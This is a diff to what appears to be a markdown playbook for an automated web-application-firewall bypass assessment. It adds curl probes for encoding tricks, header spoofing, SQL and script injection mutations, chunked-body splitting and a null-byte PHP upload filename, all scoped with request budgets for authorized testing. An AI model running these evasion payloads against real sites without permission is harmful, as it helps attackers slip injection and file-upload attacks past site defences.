@@ -120,7 +120,45 @@ run_tool curl -sS --connect-timeout 5 --max-time 20 -D "$DIR/scans/cache_one_hea
 ```
 Call this a finding only if the filter decision changes while backend identity or content remains the same; otherwise record it as an observation and do not expand the pair.
 
-### 9. Apply Reporting Discipline
+### 9. Test Encoding and Protocol-Level Obfuscation
+
+Use one probe per encoding class; each targets a different layer that may decode a payload differently than the filter inspected it.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 --path-as-is -o "$DIR/scans/enc_unicode_overlong.txt" "https://HOST/prot%c0%aeected"; run_tool curl -sS --connect-timeout 5 --max-time 20 --path-as-is -o "$DIR/scans/enc_utf16.txt" "https://HOST/protec%u0074ed" # overlong UTF-8; IIS-style unicode escape
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'X-Original-URL: /protected' -H 'X-Forwarded-Host: HOST' -o "$DIR/scans/enc_hpp.txt" "https://HOST/protected?id=1&id=2" # duplicate query key (parameter pollution)
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Transfer-Encoding: chunked' -H 'Content-Length: 4' --data-binary $'0\r\n\r\n' -o "$DIR/scans/enc_te_cl.txt" "https://HOST/protected" # TE.CL framing divergence, single request only
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H $'X-Forwarded-For:\t127.0.0.1' -o "$DIR/scans/enc_header_ws.txt" "https://HOST/protected" # tab/whitespace inside header value
+```
+
+Record which layer's decoding differs (edge WAF regex vs. backend parser) rather than assuming any status change is a bypass; a TE.CL probe here is a single non-destructive framing check, not a smuggling attempt — a confirmed desync belongs to `request-smuggling`, not this skill.
+
+### 10. Test Vendor-Specific Case, Whitespace, and Comment Mutations
+
+Different WAF regex engines normalize case, whitespace, and comment injection differently from the backend parser. Use one probe per vendor-pattern class and record which vendor's edge (from step 1's banner/header evidence) is in front of the target before selecting patterns.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -G --data-urlencode "q=SeLeCt/**/1" -o "$DIR/scans/vendor_case_comment.txt" "https://HOST/search" # ModSecurity-style: mixed case + inline SQL comment
+run_tool curl -sS --connect-timeout 5 --max-time 20 -G --data-urlencode $'q=select\x0b1' -o "$DIR/scans/vendor_vtab.txt" "https://HOST/search" # vertical-tab (0x0b) in place of space, some regex engines treat \s narrowly
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'CF-Connecting-IP: 127.0.0.1' -o "$DIR/scans/vendor_cf_header.txt" "https://HOST/protected" # Cloudflare trusted-header spoof attempt, record only
+run_tool curl -sS --connect-timeout 5 --max-time 20 -G --data-urlencode "q=<img src=x onerror=alert(1)>" -H 'X-Forwarded-Proto: https' -o "$DIR/scans/vendor_akamai_xff.txt" "https://HOST/search" # Akamai/AWS WAF-style: benign payload plus trusted-proto header
+run_tool curl -sS --connect-timeout 5 --max-time 20 -G --data-urlencode "q=SELECT%0a1" -o "$DIR/scans/vendor_newline.txt" "https://HOST/search" # newline-as-whitespace substitution
+```
+
+Record which vendor's rule set (identified from the edge banner/header fingerprint in step 1) actually let each mutation class through; a case/whitespace mutation that bypasses one vendor's default rule set is not evidence against another vendor, so never generalize across untested edges.
+
+### 11. Test Chunked-Transfer and Multipart-Boundary Evasion
+
+Some WAFs inspect only the first chunk or a fixed byte window of a chunked body, and some multipart parsers diverge from the edge's boundary handling. Use exactly one probe per class; this is a single non-destructive framing check, not a smuggling attempt — a confirmed desync still belongs to `request-smuggling`.
+
+```bash
+run_tool curl -sS --connect-timeout 5 --max-time 20 -H 'Transfer-Encoding: chunked' --data-binary $'1\r\nS\r\n1\r\nE\r\n1\r\nL\r\n1\r\nE\r\n1\r\nC\r\n1\r\nT\r\n0\r\n\r\n' -o "$DIR/scans/chunk_split_payload.txt" "https://HOST/search" # payload split across tiny chunks
+run_tool curl -sS --connect-timeout 5 --max-time 20 -F 'file=@/dev/null;filename="a.php\x00.jpg";type=image/jpeg' -o "$DIR/scans/multipart_boundary.txt" "https://HOST/upload" # boundary/filename mismatch between edge and backend multipart parser
+```
+
+A payload that reassembles cleanly at the backend despite per-chunk edge inspection is a genuine framing-level evasion signal — record the exact chunk sizes used; do not iterate chunk-size variants beyond this single probe.
+
+### 12. Apply Reporting Discipline
 
 A bypass is a finding only with a reproducible request/response pair, the layer bypassed, the affected route class, and demonstrated business impact. Use this bounded record for every candidate:
 
@@ -144,4 +182,4 @@ Rule-shape, normalization, vhost, override, rate-limit, and cache tests are conf
 
 ## Budget
 
-Technique-class maximums: boundary 4 requests, rule-shape 15, static-gap 8 samples, normalization 4, vhost 7, overrides 5, rate-limit 5, cache 2, with 60s wall-clock per host; no flooding, rotation, CAPTCHA, or out-of-scope names.
+Technique-class maximums: boundary 4 requests, rule-shape 15, static-gap 8 samples, normalization 4, vhost 7, overrides 5, rate-limit 5, cache 2, encoding/obfuscation 4, with 60s wall-clock per host; no flooding, rotation, CAPTCHA, or out-of-scope names.
